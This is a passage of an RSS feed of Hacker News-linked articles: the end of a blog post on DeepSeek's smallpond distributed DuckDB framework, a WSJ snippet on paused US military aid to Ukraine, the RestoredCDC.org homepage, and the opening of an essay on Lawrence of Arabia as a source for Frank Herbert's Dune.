Core</a><span>, through partitions.</span></p><p>A given operation is distributed based on manual partitioning provided by the user. Smallpond supports multiple partitioning strategies:</p><ul><li><p>Hash partitioning (by column values)</p></li><li><p>Even partitioning (by files or rows)</p></li><li><p>Random shuffle partitioning</p></li></ul><p><span>For each partition, a separate DuckDB instance is created within a Ray </span><a href="https://github.com/deepseek-ai/smallpond/blob/ed112db42af4d006a80861d1305a1c22cabdd359/smallpond/execution/task.py#L4" rel="">task</a><span>. Each task processes its assigned partition independently using SQL queries through DuckDB.</span></p><p><span>Given this architecture, you might notice that the framework is tightly integrated with Ray, which comes with a trade-off: it prioritizes </span><strong>scaling out</strong><span> (adding more nodes with standard hardware) over </span><strong>scaling up</strong><span> (improving the performance of a single node).</span></p><p><span>Therefore, you would need to have a Ray cluster. Multiple options exist, but you would have more options today to manage your own cluster through AWS/GCP compute or a Kubernetes cluster. Only </span><a href="https://www.anyscale.com/" rel="">Anyscale</a><span>, the company founded and led by the creators of Ray, offers a fully managed Ray service. Even then, you have the overhead of monitoring a cluster.</span></p><p><span>The great thing here is that the developer experience is nice because you get a local single node when working and only scale when you need to. But the question is: do you actually need to scale out and add the cluster overhead given that the largest machine on </span><a href="https://aws.amazon.com/ec2/instance-types/high-memory/" rel="">AWS today provides 24TB of memory</a><span>?</span></p><p>Ray Core is just for compute - where does the storage live?</p><p><span>While smallpond supports local filesystems for development and smaller workloads, the benchmark on 100TB mentioned is actually using the custom DeepSeek </span><a href="https://github.com/deepseek-ai/3FS" rel="">3FS framework</a><span>: Fire-Flyer File System is a high-performance distributed file system designed to address the challenges of AI training and inference workloads.</span></p><p><span>To put it simply, compared to AWS S3, </span><strong>3FS is built for speed, not just storage</strong><span>. While S3 is a reliable and scalable object store, it comes with higher latency and eventual consistency, making it less ideal for AI training workloads that require fast, real-time data access. 3FS, on the other hand, is a high-performance distributed file system that leverages </span><strong>SSDs and RDMA</strong><span> networks to deliver low-latency, high-throughput storage</span><strong>.</strong><span> It supports </span><strong>random access to training data</strong><span>, </span><strong>efficient checkpointing</strong><span>, and </span><strong>strong consistency</strong><span>, eliminating the need for extra caching layers or workarounds. For AI-heavy workloads that demand rapid iteration and distributed compute, 3FS offers a more optimized, AI-native storage layer—</span><strong>trading off some cost and operational complexity for raw speed and performance</strong><span>.</span></p><p><span>Because this is a specific framework from DeepSeek, you would have </span><a href="https://github.com/deepseek-ai/3FS/blob/main/deploy/README.md" rel="">to deploy your own the 3FS cluster</a><span> if you want to reach the same performance. There's no fully managed option there... or maybe this is an idea for a spinoff startup from DeepSeek? 😉</span></p><p>One interesting experiment would be to test performance at the same scale using AWS S3. However, this implementation is currently missing in smallpond. This approach would be much more practical for an average company needing 100TB of processing capability.</p><p><span>Unlike systems like </span><a href="https://spark.apache.org/" rel="">Spark</a><span> or </span><a href="https://www.getdaft.io/" rel="">Daft</a><span> that can distribute work at the query execution level (breaking down individual operations like joins or aggregations), smallpond operates at a higher level. It distributes entire partitions to workers, and each worker processes its entire partition using DuckDB.</span></p><p>This makes the architecture simpler but potentially less optimized for complex queries that would benefit from operation-level distribution.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png" width="1092" height="808" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:808,&quot;width&quot;:1092,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:145512,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://mehdio.substack.com/i/158100947?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png&quot;,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca0e10-89c4-40a1-81e9-f1bd84cda1be_1092x808.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Distributed compute levels - Image by the Author</figcaption></figure></div><p>Let's recap the features of smallpond :</p><ul><li><p><strong>Lazy evaluation with DAG-based execution</strong><span> – Operations are deferred until explicitly triggered.</span></p></li><li><p><strong>Flexible partitioning strategies</strong><span> – Supports hash, column-based, and row-based partitioning.</span></p></li><li><p><strong>Ray-powered distribution</strong><span> – Each task runs in its own DuckDB instance for parallel execution.</span></p></li><li><p><strong>Multiple storage layer options</strong><span> – Benchmarks have primarily been conducted using 3FS.</span></p></li><li><p><strong>Cluster management trade-off</strong><span> – Requires maintaining a compute cluster, though fully managed services like Anyscale can mitigate this.</span></p></li><li><p><strong>Potential 3FS overhead</strong><span> – Self-managing a 3FS cluster introduce significant additional complexity. </span></p></li></ul><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png" width="1456" height="938" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:938,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:166238,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://mehdio.substack.com/i/158100947?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png&quot;,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8638d9c6-c5e0-4026-8672-9d729ffdee81_1823x1174.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>High-level-design of smallpond Image by the Author</figcaption></figure></div><p>Another approach to distributed computing with DuckDB is through serverless functions like AWS Lambda. Here, the logic is often even simpler than partitioning, typically processing by file. Or you could decide to process per partition with some wrapper, but you won't be able to go much further than file-by-file processing.</p><p><span>Okta implemented this approach, and you can read more on </span></p><p><span> blog: </span><a href="https://juhache.substack.com/p/oktas-multi-engine-data-stack" rel="">Okta's Multi-Engine Data Stack</a></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg" width="1456" height="555" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:555,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:147088,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://mehdio.substack.com/i/158100947?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg&quot;,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff5f51204-1040-41d0-b26a-8f5fbb2ac930_1622x618.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>from Julien Hurault’s blog Okta’s Multi-Engine Data Stack</figcaption></figure></div><p><span>Finally, MotherDuck, </span><a href="https://motherduck.com/docs/concepts/architecture-and-capabilities/#dual-execution" rel="">is working on dual execution</a><span>, balancing between local and remote compute for optimize resources usage.</span></p><p>All in all, it's exciting to see that DuckDB is being used in AI-heavy workloads and that people are getting creative on how to split the compute when needed.</p><p>smallpond, while being restricted to a specific tech stack for distributing compute, aims to be simple, which aligns with the philosophy of DuckDB 👏</p><p>It's also a good reminder that there are multiple ways to scale DuckDB. Scaling up is always the simpler approach, but with smallpond and other examples mentioned here, we have plenty of options.</p><p>This approach makes sense nowadays rather than having to rely on complex and heavy distributed frameworks by default "just in case." These not only hurt your cloud costs when starting with small/medium data but also has a tax on developer experience (still love you, Apache Spark ❤️).</p><p><span>While we have powerful single-node solutions that would be enough for most use cases, </span><a href="https://www.linkedin.com/posts/mehd-io_dataengineering-activity-7298333190694293504-_B_f?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAAA0tl2QBJUocRMpCGqvWI8N_YbcsbmkLctY" rel="">especially if you're in the 94% of use cases under 10TB according to Redshift</a><span>, we now have even more options to make the Duck fly.</span></p></div></article></div><div id="discussion"><h4>Discussion about this post</h4></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[U.S. pauses all military aid to Ukraine (331 pts)]]></title>
            <link>https://www.wsj.com/politics/national-security/u-s-hitting-brakes-on-flow-of-arms-to-ukraine-980a71d1</link>
            <guid>43248919</guid>
            <pubDate>Tue, 04 Mar 2025 01:04:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/politics/national-security/u-s-hitting-brakes-on-flow-of-arms-to-ukraine-980a71d1">https://www.wsj.com/politics/national-security/u-s-hitting-brakes-on-flow-of-arms-to-ukraine-980a71d1</a>, See on <a href="https://news.ycombinator.com/item?id=43248919">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div><section><p data-type="paragraph">The U.S. will pause all military aid to Kyiv until President Trump determines that Ukrainian President <!-- -->Volodymyr Zelensky<!-- --> is making a good-faith effort toward <a data-type="link" href="https://www.wsj.com/world/europe/trump-russia-ukraine-peace-plan-istanbul-protocols-31808a75?mod=article_inline" target="_blank" rel="">peace negotiations with Russia</a>, according to a White House official.</p><p data-type="paragraph">“The president has been clear that he is focused on peace. We need our partners to be committed to that goal as well. We are pausing and reviewing our aid to ensure that it is contributing to a solution,” a White House official said in a statement.</p></section><p>Copyright ©<!-- -->2025<!-- --> Dow Jones &amp; Company, Inc. All Rights Reserved. 87990cbe856818d5eddac44c7b1cdeb8</p></div><div><p><h2>Videos</h2></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Public health data disappeared. RestoredCDC.org is bringing it back (363 pts)]]></title>
            <link>https://www.RestoredCDC.org</link>
            <guid>43248610</guid>
            <pubDate>Tue, 04 Mar 2025 00:28:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.RestoredCDC.org">https://www.RestoredCDC.org</a>, See on <a href="https://news.ycombinator.com/item?id=43248610">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<section>
	<h2>Featured Topics</h2>
			<a href="https://www.restoredcdc.org/respiratory-viruses/about/index.html">Respiratory Illnesses</a>
			<a href="https://www.restoredcdc.org/mpox/outbreaks/2023/">Mpox Outbreak</a>
			<a href="https://www.restoredcdc.org/oropouche/outbreaks/2024/index.html">Oropouche Outbreak</a>
			<a href="https://www.restoredcdc.org/food-safety/prevention/index.html">Four Steps to Food Safety</a>
			<a href="https://www.restoredcdc.org/adenovirus/about/index.html">Adenovirus</a>
			<a href="https://www.restoredcdc.org/obesity/risk-factors/risk-factors.html">Risk Factors for Obesity</a>
			<a href="https://www.restoredcdc.org/winter-weather/safety/index.html">Winter Weather</a>
	</section>
<section>
	<h2>A to Z</h2>
	<div>
			<div>
				<p>Find diseases and conditions; healthy living; workplace safety; environmental health; injury, violence and safety; global health; travelers’ health and more.</p>
				<ol>
					<li><a href="https://www.restoredcdc.org/health-topics.html#A">A</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#B">B</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#C">C</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#D">D</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#E">E</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#F">F</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#G">G</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#H">H</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#I">I</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#J">J</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#K">K</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#L">L</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#M">M</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#N">N</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#O">O</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#P">P</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#Q">Q</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#R">R</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#S">S</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#T">T</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#U">U</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#V">V</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#W">W</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#X">X</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#Y">Y</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html#Z">Z</a></li>
					<li><a href="https://www.restoredcdc.org/health-topics.html##">#</a></li>
				</ol>
			</div>
			<div>
				<a href="https://www.restoredcdc.org/common-cold/about/">
					<img src="https://www.restoredcdc.org/homepage/images/common-cold.jpg" alt="Health Topics">
					<p>Common Cold</p>
				</a>
			</div>
		</div>
</section>
<section>
	<h2>
		<span>News</span>
		<a href="https://www.restoredcdc.org/media/">All News <i aria-label="All News"></i></a>
	</h2>
	<ol>
							<li>
						<a href="https://www.restoredcdc.org/media/releases/2024/m1218-h5n1-flu.html">
							<p><span>‎‎DEC</span>
								<span>‎‎18</span>
							</p>
							<p>
								CDC Confirms First Severe Case of H5N1 Bird Flu in the United States							</p>
						</a>
					</li>
										<li>
						<a href="https://www.restoredcdc.org/media/releases/2024/a1129-salmonella-outbreak.html">
							<p><span>‎‎NOV</span>
								<span>‎‎29</span>
							</p>
							<p>
								CDC warns of a <em>Salmonella </em>outbreak linked to cucumbers							</p>
						</a>
					</li>
										<li>
						<a href="https://www.restoredcdc.org/media/releases/2024/m1122-listeria-outbreak.html">
							<p><span>‎‎NOV</span>
								<span>‎‎22</span>
							</p>
							<p>
								CDC warns of Listeria linked to ready-to-eat meat and poultry products							</p>
						</a>
					</li>
										<li>
						<a href="https://www.restoredcdc.org/media/releases/2024/p1122-h5n1-bird-flu.html">
							<p><span>‎‎NOV</span>
								<span>‎‎22</span>
							</p>
							<p>
								CDC confirms H5N1 Bird Flu Infection in a Child in California							</p>
						</a>
					</li>
										<li>
						<a href="https://www.restoredcdc.org/media/releases/2024/a1117-ecoli-organic-carrots.html">
							<p><span>‎‎NOV</span>
								<span>‎‎17</span>
							</p>
							<p>
								CDC warns of new <em>E. coli </em>outbreak linked to organic carrots							</p>
						</a>
					</li>
						</ol>
</section>
<section>
	<h2>Scientific Journals</h2>
	<div>
		<div>
			<a href="https://www.restoredcdc.org/mmwr/index.html">
				<img src="https://www.restoredcdc.org/TemplatePackage/5.0/img/homepage/mmwr.png" alt="MMWR">
				<div>
					<p>MMWR is a weekly epidemiological digest that provides timely, reliable, objective, and useful public health information.</p>
					<p><span>Learn More <i></i></span>
				</p></div>
			</a>
		</div>
		<div>
			<a href="https://www.restoredcdc.org/wwwnc.cdc.gov/eid/">
				<img src="https://www.restoredcdc.org/TemplatePackage/5.0/img/homepage/eid.png" alt="EID">
				<div>
					<p>EID is a monthly peer reviewed journal covering infectious diseases with emphasis on disease prevention, control, and elimination.</p>
					<p><span>Learn More <i></i></span>
				</p></div>
			</a>
		</div>
		<div>
			<a href="https://www.restoredcdc.org/pcd/index.htm">
				<img src="https://www.restoredcdc.org/TemplatePackage/5.0/img/homepage/pcd.png" alt="PCD">
				<div>
					<p>PCD is a peer reviewed journal covering research, public health findings, innovations, and practices on chronic diseases.</p>
					<p><span>Learn More <i></i></span>
				</p></div>
			</a>
		</div>
	</div>
</section>

<div>
			<div>
				<p><img src="https://www.restoredcdc.org/homepage/images/science-cdc.jpg" alt="Science at CDC">
				</p>
			</div>
			<div>
					<h2>Science at CDC</h2>
					<p>To make science and data easier for broad audiences to interpret, CDC is translating science into practical, easy to understand policy by clarifying and presenting scientific language so that anyone can understand it and standardizing guideline development across the agency.</p>
<ul>
<li><a href="https://www.restoredcdc.org/about/cdc-moving-forward.html">CDC Moving Forward</a></li>
<li><a href="https://www.restoredcdc.org/about/priorities/index.html">Advancing Science &amp; Health Equity</a></li>
</ul>
									</div>
		</div>
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Lawrence of Arabia, Paul Atreides, and the roots of Frank Herbert's Dune (2021) (226 pts)]]></title>
            <link>https://reactormag.com/lawrence-of-arabia-paul-atreides-and-the-roots-of-frank-herberts-dune/</link>
            <guid>43248429</guid>
            <pubDate>Tue, 04 Mar 2025 00:04:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://reactormag.com/lawrence-of-arabia-paul-atreides-and-the-roots-of-frank-herberts-dune/">https://reactormag.com/lawrence-of-arabia-paul-atreides-and-the-roots-of-frank-herberts-dune/</a>, See on <a href="https://news.ycombinator.com/item?id=43248429">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          <p>At first glance, Frank Herbert’s <em>Dune </em>(1965) might appear to be a mere copy of the story of Lawrence of Arabia with some science-fictional window dressing. Several critics have pointed to the similarities between Lawrence and Paul Atreides—both are foreign figures who immerse themselves in a desert culture and help lead the locals to overthrow their oppressors.</p>
<p>The 1962 film based on a romanticized version of Lawrence’s journey, <a href="https://www.imdb.com/title/tt0056172/"><em>Lawrence of Arabia </em>(directed by David Lean)</a>, was critically acclaimed and widely popular. It rested on the idea of the ‘white savior,’ whose role was to lend a sympathetic ear to oppressed peoples and provide assistance to improve their lot in life. Released at a time when U.S. relations in the Middle East were becoming more complicated and the Cold War was reaching new heights of tension, this offered a potentially reassuring message that Western involvement in foreign affairs could be heroic and therefore welcomed.</p>

<p>Herbert himself was very interested in exploring desert cultures and religions. As part of his extensive research and writing process, he read hundreds of books, including T.E. Lawrence’s wartime memoir, <em>Seven Pillars of Wisdom: A Triumph</em> (1926) [Brian Herbert, <em>Dreamer of </em>Dune, Tom Doherty Associates, 2003] He saw messianic overtones in Lawrence’s story and the possibility for outsiders to manipulate a culture according to their own purposes. [Timothy O’Reilly, <em>Frank Herbert</em>, Frederick Ungar Publishing, 1981]</p>
<p>Yet, although Lawrence’s narrative was certainly an inspiration for key aspects of <em>Dune</em>, there are also critical contrasts in the portrayals of Lawrence and Paul, the Arabs and the Fremen, women, and religion. What follows is a discussion of some similarities and differences between the fictional world of <em>Dune </em>and the worlds in <em>Seven Pillars of Wisdom</em> as filtered through Lawrence’s recollections of his time as a go-between figure in the British and Arab camps during World War I. This overview will demonstrate how Herbert adapted and modified elements of Lawrence’s story to create a world in <em>Dune </em>that is both familiar and new.</p>

<h4>Introducing Lawrence</h4>
<p>The subject of over 70 biographies and multiple films, plays, and other writings, T.E. Lawrence is a household name for many in the West. [Scott Anderson, “<a href="https://www.smithsonianmag.com/history/true-story-lawrence-arabia-180951857/?page=1">The True Story of Lawrence of Arabia</a>,” <em>Smithsonian Magazine</em>, 2014] He was an officer in the British Army during WWI who served as an adviser to the Arabs and helped in their revolt against the Turks, though the extent of his influence is disputed among historians. [Stanley Weintraub, “<a href="https://www.britannica.com/biography/T-E-Lawrence">T.E. Lawrence</a>,” Encyclopedia Britannica, 2020] Other figures, such as British archaeologist and writer Gertrude Bell, were better known at the time and arguably had a greater impact on Middle Eastern politics. [Georgina Howell, <em>Queen of the Desert: The Extraordinary Life of Gertrude Bell</em>, Pan Books, 2015] But after American journalist Lowell Thomas seized upon Lawrence’s story in 1918, Lawrence’s fame grew to eclipse that of his contemporaries.</p>
<p>Interestingly, whether or not others consider Lawrence of Arabia to be a hero, Lawrence does not portray himself that way in <em>Seven Pillars of Wisdom</em>. Instead, he appears as a conflicted man, trying to bridge two worlds but feeling like a fraud. On the one hand, he explains the ways in which he becomes like one of the Arabs: in dress, in mannerisms, and in the ability to appreciate desert living. He takes some pleasure in being hardier and more knowledgeable than his fellow British associates.</p>
<p>On the other hand, there are varying degrees of contempt in his descriptions of the Arabs and their differences from the British. Filtering his experiences through his British sensibilities creates a sense of superiority at times that adds to the cultural barrier he faces. Although Lawrence himself may have been accepted and respected by his Arab companions, the image of Lawrence of Arabia is problematic for its implication that native peoples need a ‘white savior’ to rescue them from their oppression.</p>
<p>This continues to be a topic of debate in relation to <em>Dune</em>, as shown, for example, in Emmet Asher-Perrin’s Tor.com article <a href="https://reactormag.com/2019/03/06/why-its-important-to-consider-whether-dune-is-a-white-savior-narrative/">Why It’s Important to Consider Whether <em>Dune</em> Is a White Savior Narrative</a>.</p>

<h4>Lawrence of Arabia</h4>
<figure id="attachment_647163" aria-describedby="caption-attachment-647163"><img decoding="async" src="https://reactormag.com/wp-content/uploads/2021/05/TE-Lawrence-of-Arabia-1.jpg" alt="" width="500" height="667"><figcaption id="caption-attachment-647163">Photo of T.E. Lawrence taken by American journalist Lowell Thomas in 1919</figcaption></figure>
<p>Both Lawrence and Paul appear to be men raised in Western cultures who adopt the ways of a Middle Eastern culture in order to blend in and meet their goal of rallying a fighting force to meet their own (imperial) goals. They understand the importance of desert power and act as a bridge between the two worlds they inhabit to facilitate the use of this force.</p>
